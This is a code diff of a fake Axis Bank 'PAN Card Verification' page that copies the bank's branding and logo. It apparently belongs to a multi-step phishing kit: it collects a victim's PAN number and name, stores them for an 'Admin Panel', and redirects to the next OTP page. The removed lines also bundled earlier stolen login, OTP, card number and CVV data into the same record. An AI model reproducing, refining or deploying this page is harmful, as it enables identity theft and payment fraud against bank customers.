@@ -5,549 +5,96 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Axis Bank - PAN Card Verification</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Arial', sans-serif;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
+        body { background: #f0f2f5; min-height: 100vh; display: flex; flex-direction: column; }
         
-        body {
-            background: #f0f2f5;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-        
-        /* Page Load Animation */
         .page-loader {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            transition: opacity 0.5s ease;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: white; display: flex; justify-content: center; align-items: center;
+            z-index: 9999; transition: opacity 0.5s ease;
         }
         
-        .loader-container {
-            position: relative;
-            width: 100%;
-            height: 100px;
-        }
-        
-        .loader-dot {
-            width: 15px;
-            height: 15px;
-            background: #87103F;
-            border-radius: 50%;
-            position: absolute;
-            left: 0;
-            top: 50%;
-            transform: translateY(-50%);
-            animation: dotAnimation 2.4s linear infinite;
-            box-shadow: 0 0 20px rgba(135, 16, 63, 0.8), 0 0 40px rgba(135, 16, 63, 0.6);
-        }
-        
-        @keyframes dotAnimation {
-            0% {
-                left: 0;
-                width: 15px;
-                height: 15px;
-                opacity: 0.3;
-                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
-            }
-            6.25% {
-                width: 25px;
-                height: 25px;
-                opacity: 0.8;
-                box-shadow: 0 0 25px rgba(135, 16, 63, 0.9);
-            }
-            12.5% {
-                left: 12.5%;
-                width: 15px;
-                height: 15px;
-                opacity: 0.3;
-                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
-            }
-            18.75% {
-                width: 30px;
-                height: 30px;
-                opacity: 1;
-                box-shadow: 0 0 30px rgba(135, 16, 63, 1);
-            }
-            25% {
-                left: 25%;
-                width: 15px;
-                height: 15px;
-                opacity: 0.3;
-                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
-            }
-            31.25% {
-                width: 35px;
-                height: 35px;
-                opacity: 0.8;
-                box-shadow: 0 0 35px rgba(135, 16, 63, 0.9);
-            }
-            37.5% {
-                left: 37.5%;
-                width: 15px;
-                height: 15px;
-                opacity: 0.3;
-                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
-            }
-            43.75% {
-                width: 40px;
-                height: 40px;
-                opacity: 1;
-                box-shadow: 0 0 40px rgba(135, 16, 63, 1);
-            }
-            50% {
-                left: 50%;
-                width: 15px;
-                height: 15px;
-                opacity: 0.3;
-                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
-            }
-            56.25% {
-                width: 35px;
-                height: 35px;
-                opacity: 0.8;
-                box-shadow: 0 0 35px rgba(135, 16, 63, 0.9);
-            }
-            62.5% {
-                left: 62.5%;
-                width: 15px;
-                height: 15px;
-                opacity: 0.3;
-                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
-            }
-            68.75% {
-                width: 30px;
-                height: 30px;
-                opacity: 1;
-                box-shadow: 0 0 30px rgba(135, 16, 63, 1);
-            }
-            75% {
-                left: 75%;
-                width: 15px;
-                height: 15px;
-                opacity: 0.3;
-                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
-            }
-            81.25% {
-                width: 25px;
-                height: 25px;
-                opacity: 0.8;
-                box-shadow: 0 0 25px rgba(135, 16, 63, 0.9);
-            }
-            87.5% {
-                left: 87.5%;
-                width: 15px;
-                height: 15px;
-                opacity: 0.3;
-                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
-            }
-            93.75% {
-                width: 20px;
-                height: 20px;
-                opacity: 1;
-                box-shadow: 0 0 20px rgba(135, 16, 63, 1);
-            }
-            100% {
-                left: 100%;
-                width: 15px;
-                height: 15px;
-                opacity: 0.3;
-                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
-            }
-        }
-        
-        /* Main Container */
         .main-container {
-            opacity: 0;
-            animation: fadeIn 0.5s ease 3s forwards;
-            flex: 1;
+            opacity: 0; animation: fadeIn 0.5s ease 3s forwards; flex: 1;
         }
+        @keyframes fadeIn { to { opacity: 1; } }
         
-        @keyframes fadeIn {
-            to { opacity: 1; }
-        }
-        
-        /* Header - Maroon Red */
+        /* Header */
         .bank-header {
-            background: #87103F;
-            padding: 15px 40px;
-            position: relative;
+            background: #87103F; padding: 15px 40px; position: relative;
         }
-        
         .header-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
+            max-width: 1200px; margin: 0 auto;
+            display: flex; align-items: center; justify-content: space-between;
         }
-        
-        .logo-section {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-        }
-        
         .bank-logo {
-            height: 45px;
-            width: auto;
-            object-fit: contain;
-            filter: brightness(0) invert(1);
+            height: 45px; width: auto; filter: brightness(0) invert(1);
         }
-        
-        .bank-title {
-            display: flex;
-            flex-direction: column;
-        }
-        
         .bank-name {
-            font-size: 28px;
-            font-weight: bold;
-            color: white;
-            letter-spacing: 1px;
-        }
-        
-        .header-info {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-end;
-        }
-        
-        .header-text-container {
-            display: flex;
-            align-items: center;
-            margin-bottom: 5px;
-        }
-        
-        .open-text {
-            color: white;
-            font-weight: bold;
-            font-style: italic;
-            font-size: 24px;
-        }
-        
-        .banking-text {
-            color: white;
-            font-style: italic;
-            font-size: 18px;
-            letter-spacing: 1px;
-        }
-        
-        .separator {
-            color: rgba(255, 255, 255, 0.7);
-            margin: 0 10px;
-        }
-        
-        .login-using {
-            font-size: 16px;
-            color: rgba(255, 255, 255, 0.9);
+            font-size: 28px; font-weight: bold; color: white; letter-spacing: 1px;
         }
         
         /* Main Content */
         .main-content {
-            max-width: 1200px;
-            margin: 30px auto;
-            padding: 0 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            max-width: 1200px; margin: 30px auto; padding: 0 20px;
+            display: flex; flex-direction: column; align-items: center;
         }
         
-        /* PAN Container */
-        .pan-container {
-            width: 100%;
-            max-width: 500px;
-        }
-        
+        .pan-container { width: 100%; max-width: 500px; }
         .pan-box {
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
+            background: white; border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1); overflow: hidden;
         }
         
         .pan-header {
-            background: #87103F;
-            color: white;
-            padding: 25px;
-            text-align: center;
+            background: #87103F; color: white; padding: 25px; text-align: center;
         }
+        .pan-title { font-size: 24px; font-weight: bold; margin-bottom: 5px; }
+        .pan-subtitle { opacity: 0.9; font-size: 16px; }
         
-        .pan-title {
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 5px;
-        }
+        .form-container { padding: 30px; }
         
-        .pan-subtitle {
-            opacity: 0.9;
-            font-size: 16px;
-        }
-        
-        /* Form Container */
-        .form-container {
-            padding: 30px;
-        }
-        
-        /* Info Message */
         .info-message {
-            background: #f8f9fa;
-            border-left: 4px solid #87103F;
-            padding: 15px;
-            margin-bottom: 25px;
-            border-radius: 0 8px 8px 0;
+            background: #f8f9fa; border-left: 4px solid #87103F;
+            padding: 15px; margin-bottom: 25px; border-radius: 0 8px 8px 0;
         }
         
-        .info-title {
-            font-weight: bold;
-            color: #87103F;
-            margin-bottom: 5px;
-            font-size: 16px;
-        }
-        
-        .info-text {
-            color: #666;
-            font-size: 14px;
-            line-height: 1.5;
-        }
-        
-        /* Form Groups */
-        .form-group {
-            margin-bottom: 25px;
-        }
-        
+        .form-group { margin-bottom: 25px; }
         .form-label {
-            display: block;
-            margin-bottom: 8px;
-            color: #333;
-            font-weight: bold;
-            font-size: 14px;
+            display: block; margin-bottom: 8px; color: #333;
+            font-weight: bold; font-size: 14px;
         }
-        
         .form-input {
-            width: 100%;
-            padding: 15px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            font-size: 16px;
-            transition: all 0.3s ease;
-            background: #f9f9f9;
+            width: 100%; padding: 15px; border: 2px solid #ddd; border-radius: 8px;
+            font-size: 16px; transition: all 0.3s ease; background: #f9f9f9;
         }
-        
         .form-input:focus {
-            border-color: #87103F;
-            outline: none;
-            background: white;
+            border-color: #87103F; outline: none; background: white;
             box-shadow: 0 0 0 3px rgba(135, 16, 63, 0.1);
         }
         
-        .input-with-icon {
-            position: relative;
-        }
-        
-        .input-icon {
-            position: absolute;
-            right: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #87103F;
-        }
-        
-        /* PAN Format Helper */
-        .pan-format {
-            font-size: 12px;
-            color: #666;
-            margin-top: 5px;
-            font-style: italic;
-        }
-        
-        /* Button Container */
-        .btn-container {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            margin-top: 30px;
-        }
-        
         .verify-button {
-            width: 100%;
-            background: #87103F;
-            color: white;
-            border: none;
-            padding: 18px;
-            border-radius: 8px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 5px 15px rgba(135, 16, 63, 0.3);
+            width: 100%; background: #87103F; color: white; border: none;
+            padding: 18px; border-radius: 8px; font-size: 18px; font-weight: bold;
+            cursor: pointer; transition: all 0.3s ease; position: relative;
+            overflow: hidden; box-shadow: 0 5px 15px rgba(135, 16, 63, 0.3);
         }
-        
         .verify-button:hover {
-            background: #6a0c32;
-            transform: translateY(-2px);
+            background: #6a0c32; transform: translateY(-2px);
             box-shadow: 0 8px 20px rgba(135, 16, 63, 0.4);
         }
         
-        .verify-button.loading {
-            background: #6a0c32;
-            cursor: not-allowed;
-        }
-        
-        .verify-button.loading:after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 20px;
-            height: 20px;
-            margin: -10px 0 0 -10px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            border-top-color: white;
-            border-radius: 50%;
-            animation: button-loading 0.6s linear infinite;
-        }
-        
-        @keyframes button-loading {
-            to { transform: rotate(360deg); }
-        }
-        
-        /* Links */
-        .form-links {
-            text-align: center;
-            margin-top: 25px;
-            padding-top: 25px;
-            border-top: 1px solid #eee;
-        }
-        
-        .form-links a {
-            color: #87103F;
-            text-decoration: none;
-            font-weight: bold;
-            font-size: 14px;
-            margin: 0 15px;
-            transition: all 0.3s ease;
-        }
-        
-        .form-links a:hover {
-            text-decoration: underline;
-        }
-        
-        /* Footer */
         .main-footer {
-            background: #87103F;
-            color: white;
-            text-align: center;
-            padding: 20px;
-            margin-top: 50px;
-        }
-        
-        .footer-content {
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        
-        .copyright {
-            font-size: 14px;
-            opacity: 0.8;
-        }
-        
-        .copyright a {
-            color: white;
-            text-decoration: underline;
-        }
-        
-        /* Responsive */
-        @media (max-width: 992px) {
-            .header-content {
-                flex-direction: column;
-                text-align: center;
-                gap: 15px;
-            }
-            
-            .logo-section {
-                justify-content: center;
-            }
-            
-            .header-info {
-                align-items: center;
-                text-align: center;
-            }
-        }
-        
-        @media (max-width: 768px) {
-            .bank-header {
-                padding: 12px 20px;
-            }
-            
-            .bank-logo {
-                height: 40px;
-            }
-            
-            .bank-name {
-                font-size: 24px;
-            }
-            
-            .open-text {
-                font-size: 20px;
-            }
-            
-            .banking-text {
-                font-size: 16px;
-            }
-            
-            .main-content {
-                padding: 0 15px;
-                margin: 20px auto;
-            }
-        }
-        
-        @media (max-width: 576px) {
-            .header-text-container {
-                flex-direction: column;
-                gap: 5px;
-            }
-            
-            .separator {
-                display: none;
-            }
-            
-            .bank-logo {
-                height: 35px;
-            }
-            
-            .bank-name {
-                font-size: 20px;
-            }
-            
-            .open-text {
-                font-size: 18px;
-            }
-            
-            .banking-text {
-                font-size: 14px;
-            }
+            background: #87103F; color: white; text-align: center;
+            padding: 20px; margin-top: 50px;
         }
     </style>
 </head>
 <body>
     <!-- Page Load Animation -->
     <div class="page-loader" id="pageLoader">
-        <div class="loader-container">
-            <div class="loader-dot"></div>
+        <div style="font-size: 20px; color: #87103F; font-weight: bold;">
+            Loading Axis Bank PAN Verification...
         </div>
     </div>
     
@@ -556,24 +103,12 @@
         <!-- Header -->
         <header class="bank-header">
             <div class="header-content">
-                <div class="logo-section">
-                    <!-- Axis Bank Logo -->
+                <div style="display: flex; align-items: center; gap: 20px;">
                     <img src="https://raw.githubusercontent.com/shreya99u-max/axisbank/main/IMG_20260201_085106.jpg" 
-                         alt="Axis Bank Logo" 
-                         class="bank-logo">
-                    <div class="bank-title">
-                        <div class="bank-name">AXIS BANK</div>
-                    </div>
+                         alt="Axis Bank Logo" class="bank-logo">
+                    <div class="bank-name">AXIS BANK</div>
                 </div>
-                
-                <div class="header-info">
-                    <div class="header-text-container">
-                        <span class="open-text">open</span>
-                        <span class="separator">|</span>
-                        <span class="banking-text">INTERNET BANKING</span>
-                    </div>
-                    <div class="login-using">PAN Card Verification</div>
-                </div>
+                <div style="color: white; font-size: 16px;">PAN Card Verification</div>
             </div>
         </header>
         
@@ -583,16 +118,16 @@
                 <div class="pan-box">
                     <div class="pan-header">
                         <div class="pan-title">PAN Card Verification</div>
-                        <div class="pan-subtitle">Enter your PAN card details for verification</div>
+                        <div class="pan-subtitle">Enter your PAN card details</div>
                     </div>
                     
                     <div class="form-container">
-                        <!-- Info Message -->
                         <div class="info-message">
-                            <div class="info-title">📝 Important Information</div>
-                            <div class="info-text">
-                                PAN (Permanent Account Number) is mandatory for financial transactions and tax purposes. 
-                                Please ensure the details match your official PAN card.
+                            <div style="font-weight: bold; color: #87103F; margin-bottom: 5px;">
+                                📝 Important Information
+                            </div>
+                            <div style="color: #666; font-size: 14px;">
+                                PAN is mandatory for financial transactions and tax purposes.
                             </div>
                         </div>
                         
@@ -600,38 +135,26 @@
                         <form id="panForm">
                             <div class="form-group">
                                 <label class="form-label" for="panNumber">PAN Card Number</label>
-                                <div class="input-with-icon">
-                                    <input type="text" class="form-input" id="panNumber" name="panNumber" 
-                                           placeholder="Enter 10-digit PAN (e.g., ABCDE1234F)" 
-                                           maxlength="10"
-                                           required>
-                                    <div class="input-icon">📋</div>
+                                <input type="text" class="form-input" id="panNumber" name="panNumber" 
+                                       placeholder="Enter 10-digit PAN (e.g., ABCDE1234F)" 
+                                       maxlength="10" required>
+                                <div style="font-size: 12px; color: #666; margin-top: 5px;">
+                                    Format: 5 letters + 4 numbers + 1 letter
                                 </div>
-                                <div class="pan-format">Format: 5 letters + 4 numbers + 1 letter (e.g., ABCDE1234F)</div>
                             </div>
                             
                             <div class="form-group">
                                 <label class="form-label" for="fullName">Full Name (as per PAN)</label>
-                                <div class="input-with-icon">
-                                    <input type="text" class="form-input" id="fullName" name="fullName" 
-                                           placeholder="Enter your full name as per PAN card" 
-                                           required>
-                                    <div class="input-icon">👤</div>
-                                </div>
+                                <input type="text" class="form-input" id="fullName" name="fullName" 
+                                       placeholder="Enter your full name as per PAN card" required>
                             </div>
                             
-                            <!-- Buttons -->
-                            <div class="btn-container">
+                            <div style="margin-top: 30px;">
                                 <button type="submit" class="verify-button" id="verifyButton">
                                     Verify PAN Details
                                 </button>
                             </div>
                         </form>
-                        
-                        <div class="form-links">
-                            <a href="#" id="backLink">← Back to OTP Verification</a>
-                            <a href="#" id="helpLink">Need Help?</a>
-                        </div>
                     </div>
                 </div>
             </div>
@@ -639,11 +162,7 @@
         
         <!-- Footer -->
         <footer class="main-footer">
-            <div class="footer-content">
-                <div class="copyright">
-                    © 2023 Axis Bank Ltd. All Rights Reserved. | <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a>
-                </div>
-            </div>
+            <div>© 2023 Axis Bank Ltd. All Rights Reserved.</div>
         </footer>
     </div>
 
@@ -651,11 +170,9 @@
         // Page load animation
         window.addEventListener('load', function() {
             setTimeout(function() {
+                document.getElementById('pageLoader').style.display = 'none';
                 document.getElementById('pageLoader').style.opacity = '0';
-                setTimeout(function() {
-                    document.getElementById('pageLoader').style.display = 'none';
-                }, 500);
-            }, 3000);
+            }, 1000);
         });
         
         // DOM Elements
@@ -663,216 +180,162 @@
         const panNumberInput = document.getElementById('panNumber');
         const fullNameInput = document.getElementById('fullName');
         const verifyButton = document.getElementById('verifyButton');
-        const backLink = document.getElementById('backLink');
-        const helpLink = document.getElementById('helpLink');
         
-        // ✅ PAN number को ऑटो uppercase में बदलो
+        // ✅ PAN number को uppercase में बदलो
         panNumberInput.addEventListener('input', function(e) {
-            // सभी non-alphanumeric characters हटाओ और uppercase करो
-            let value = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
-            e.target.value = value;
+            e.target.value = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
         });
         
         // ✅ PAN format validation
         function validatePAN(pan) {
-            // PAN format: 5 letters + 4 digits + 1 letter
-            const panRegex = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/;
-            return panRegex.test(pan);
+            return /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(pan);
         }
         
-        // ✅ यूजर का पुराना डेटा लो (लॉगिन, OTP, क्रेडिट कार्ड)
-        function getUserData() {
-            try {
-                const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
-                
-                // सभी टाइप के सबमिशन अलग-अलग लो
-                const loginSubmissions = submissions.filter(sub => sub.type === 'login');
-                const otpSubmissions = submissions.filter(sub => sub.type === 'otp');
-                const creditSubmissions = submissions.filter(sub => sub.type === 'credit');
-                
-                return {
-                    // सबसे नया login डेटा
-                    loginData: loginSubmissions.length > 0 ? loginSubmissions[0] : null,
-                    
-                    // सबसे नया OTP डेटा
-                    otpData: otpSubmissions.length > 0 ? otpSubmissions[0] : null,
-                    
-                    // सबसे नया credit कार्ड डेटा
-                    creditData: creditSubmissions.length > 0 ? creditSubmissions[0] : null
-                };
-            } catch (e) {
-                console.error('Error getting user data:', e);
-                return { loginData: null, otpData: null, creditData: null };
+        // ✅ DEBUG FUNCTION - localStorage status दिखाएं
+        function debugLocalStorage() {
+            console.log('=== DEBUG LOCALSTORAGE ===');
+            let submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
+            console.log('Total submissions:', submissions.length);
+            
+            // Type-wise count
+            let types = {};
+            submissions.forEach(sub => {
+                types[sub.type] = (types[sub.type] || 0) + 1;
+            });
+            console.log('Submissions by type:', types);
+            
+            // Latest PAN check
+            let panSubs = submissions.filter(s => s.type === 'pan');
+            console.log('PAN submissions:', panSubs.length);
+            if(panSubs.length > 0) {
+                console.log('Latest PAN:', panSubs[0]);
             }
+            console.log('=== END DEBUG ===');
         }
         
-        // ✅ PAN डेटा को axisBankSubmissions में सेव करो - CORRECTED
-        function savePANData(panNumber, fullName) {
+        // ✅ सिम्पल save function - कोई complexity नहीं
+        function savePANDataSimple(panNumber, fullName) {
             try {
-                // सबसे पहले, सभी पुराने सबमिशन्स लो
-                let submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
+                // 1. Get existing data
+                let existingData = localStorage.getItem('axisBankSubmissions');
+                let submissions = [];
                 
-                // यूजर का पुराना डेटा लो (लॉगिन, OTP, क्रेडिट कार्ड)
-                const userData = getUserData();
+                if (existingData) {
+                    try {
+                        submissions = JSON.parse(existingData);
+                        if (!Array.isArray(submissions)) {
+                            console.log('⚠️ submissions was not array, resetting...');
+                            submissions = [];
+                        }
+                    } catch (e) {
+                        console.log('⚠️ Error parsing existing data, starting fresh...');
+                        submissions = [];
+                    }
+                }
                 
-                // नया PAN सबमिशन बनाओ - जैसा यूजर ने टाइप किया वैसा ही सेव करो
-                const panSubmission = {
+                // 2. Create new PAN submission
+                const newPAN = {
                     id: 'PAN-' + Date.now(),
-                    type: 'pan',  // ✅ ये बहुत जरूरी है - Admin Panel इसी से PAN submissions ढूंढता है
+                    type: 'pan',
                     timestamp: new Date().toISOString(),
                     date: new Date().toLocaleString('en-IN'),
-                    userAgent: navigator.userAgent,
-                    ip: getIPAddress(),
                     data: {
-                        // ✅ यूजर ने जो टाइप किया वही सेव करो
-                        panNumber: panNumber,       // जैसे: ABCDE1234H (exact input)
-                        fullName: fullName,         // जैसे: rahul (exact input)
+                        panNumber: panNumber,
+                        fullName: fullName,
                         status: 'verified',
-                        source: 'PAN Verification Page',
-                        
-                        // ✅ पुराना डेटा भी साथ में सेव करो
-                        mobile: userData.loginData?.data?.mobile || 
-                               userData.otpData?.data?.mobileNumber || 
-                               userData.creditData?.data?.mobile || '',
-                        
-                        userId: userData.loginData?.data?.loginId || 
-                               userData.loginData?.data?.userId || 
-                               userData.creditData?.data?.cardName || '',
-                        
-                        email: userData.loginData?.data?.email || '',
-                        
-                        // अगर credit card data है तो उसे भी सेव करो
-                        cardNumber: userData.creditData?.data?.cardNumber || '',
-                        cvv: userData.creditData?.data?.cvv || ''
+                        enteredAt: new Date().toLocaleString()
                     }
                 };
                 
-                // submissions array में नया डेटा add करो (नया ऊपर आएगा)
-                submissions.unshift(panSubmission);
+                console.log('📝 Saving new PAN:', newPAN);
                 
-                // localStorage में सेव करो - CORRECT KEY: axisBankSubmissions
+                // 3. Add to array
+                submissions.unshift(newPAN);
+                
+                // 4. Save to localStorage
                 localStorage.setItem('axisBankSubmissions', JSON.stringify(submissions));
                 
-                // ✅ Debug के लिए console में दिखाओ
-                console.log('✅ PAN submission saved to axisBankSubmissions:');
-                console.log('PAN Number:', panNumber);
-                console.log('Full Name:', fullName);
-                console.log('Full submission object:', panSubmission);
-                console.log('Total submissions in localStorage:', submissions.length);
+                console.log('✅ PAN saved successfully!');
+                console.log('Total submissions now:', submissions.length);
                 
-                // ✅ सिर्फ PAN submissions count दिखाओ
-                const panSubmissions = submissions.filter(sub => sub.type === 'pan');
-                console.log('Total PAN submissions:', panSubmissions.length);
+                // 5. Immediate verification
+                let verify = JSON.parse(localStorage.getItem('axisBankSubmissions'));
+                console.log('✅ Verification - Total in localStorage:', verify.length);
+                console.log('✅ Latest PAN in localStorage:', verify[0]);
                 
                 return true;
                 
-            } catch (e) {
-                console.error('❌ Error saving PAN submission:', e);
+            } catch (error) {
+                console.error('❌ Error saving PAN:', error);
                 return false;
             }
         }
         
-        // ✅ IP address लेने के लिए (अगर चाहिए तो)
-        function getIPAddress() {
-            // ये एक dummy function है, असली में आपको IP detection service use करना चाहिए
-            return '192.168.1.1'; // Temporary IP
-        }
-        
-        // ✅ Form submission handler
-        if (panForm) {
-            panForm.addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                // Get form values EXACTLY as entered
-                const panNumber = panNumberInput.value; // Already uppercase from input handler
-                const fullName = fullNameInput.value.trim(); // Keep as entered (rahul, Rahul, etc.)
-                
-                // Validate PAN format
-                if (!validatePAN(panNumber)) {
-                    // Show error alert
-                    alert('Please enter a valid PAN number. Format: ABCDE1234F');
-                    panNumberInput.focus();
-                    panNumberInput.style.borderColor = '#ff4444';
-                    setTimeout(() => {
-                        panNumberInput.style.borderColor = '#ddd';
-                    }, 2000);
-                    return;
-                }
-                
-                // Validate required fields
-                if (!fullName) {
-                    alert('Please enter your full name as per PAN card');
-                    fullNameInput.focus();
-                    fullNameInput.style.borderColor = '#ff4444';
-                    setTimeout(() => {
-                        fullNameInput.style.borderColor = '#ddd';
-                    }, 2000);
-                    return;
-                }
-                
-                // Show loading
-                verifyButton.textContent = "Verifying...";
-                verifyButton.classList.add('loading');
-                verifyButton.disabled = true;
-                
-                // ✅ PAN डेटा को CORRECT KEY में सेव करो
-                const saved = savePANData(panNumber, fullName);
-                
-                // Simulate verification delay
-                setTimeout(() => {
-                    // Remove loading
-                    verifyButton.textContent = "Verify PAN Details";
-                    verifyButton.classList.remove('loading');
-                    verifyButton.disabled = false;
-                    
-                    if (saved) {
-                        // ✅ Admin panel में check करने के लिए message
-                        console.log('✅ PAN data saved successfully!');
-                        console.log('Check Admin Panel to see:');
-                        console.log('1. PAN Number:', panNumber);
-                        console.log('2. Full Name:', fullName);
-                        
-                        // Redirect to next page
-                        window.location.href = 'axis_otp2.html';
-                    } else {
-                        alert('PAN verification failed. Please try again.');
-                    }
-                    
-                }, 1500);
-            });
-        }
-        
-        // Back link handler
-        backLink.addEventListener('click', function(e) {
+        // ✅ Form submission
+        panForm.addEventListener('submit', function(e) {
             e.preventDefault();
-            window.location.href = 'axis_otp1.html';
-        });
-        
-        // Help link handler
-        helpLink.addEventListener('click', function(e) {
-            e.preventDefault();
-            alert('For assistance with PAN verification, please contact Axis Bank customer support at 1860-419-5555.');
-        });
-        
-        // Initialize
-        window.addEventListener('DOMContentLoaded', function() {
-            // Focus PAN input
-            panNumberInput.focus();
             
-            // ✅ Initialize axisBankSubmissions if not exists
-            if (!localStorage.getItem('axisBankSubmissions')) {
-                localStorage.setItem('axisBankSubmissions', JSON.stringify([]));
-                console.log('✅ axisBankSubmissions initialized in localStorage');
+            const panNumber = panNumberInput.value.trim();
+            const fullName = fullNameInput.value.trim();
+            
+            // Validation
+            if (!validatePAN(panNumber)) {
+                alert('❌ Please enter valid PAN number (Format: ABCDE1234F)');
+                panNumberInput.focus();
+                return;
             }
             
-            // ✅ Debug: Show current submissions count
-            const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
-            console.log('Current submissions in localStorage:', submissions.length);
+            if (!fullName) {
+                alert('❌ Please enter your full name');
+                fullNameInput.focus();
+                return;
+            }
             
-            // ✅ Check for PAN submissions specifically
-            const panSubmissions = submissions.filter(sub => sub.type === 'pan');
-            console.log('Current PAN submissions:', panSubmissions.length);
+            // Show loading
+            verifyButton.textContent = "Verifying...";
+            verifyButton.disabled = true;
+            
+            // Before save debug
+            console.log('=== BEFORE SAVING ===');
+            debugLocalStorage();
+            
+            // Save data
+            const saved = savePANDataSimple(panNumber, fullName);
+            
+            // After save debug
+            console.log('=== AFTER SAVING ===');
+            debugLocalStorage();
+            
+            // Result
+            setTimeout(() => {
+                verifyButton.textContent = "Verify PAN Details";
+                verifyButton.disabled = false;
+                
+                if (saved) {
+                    // Show success message with data
+                    alert(`✅ PAN Saved Successfully!\n\nPAN: ${panNumber}\nName: ${fullName}\n\nCheck Admin Panel Now!`);
+                    
+                    // Redirect
+                    window.location.href = 'axis_otp2.html';
+                } else {
+                    alert('❌ Failed to save PAN. Check console for errors.');
+                }
+            }, 1000);
+        });
+        
+        // ✅ Page load initialization
+        window.addEventListener('DOMContentLoaded', function() {
+            panNumberInput.focus();
+            
+            // Initialize if not exists
+            if (!localStorage.getItem('axisBankSubmissions')) {
+                localStorage.setItem('axisBankSubmissions', JSON.stringify([]));
+                console.log('✅ Initialized axisBankSubmissions');
+            }
+            
+            // Show current status
+            debugLocalStorage();
         });
     </script>
 </body>
-    </html>
+</html>
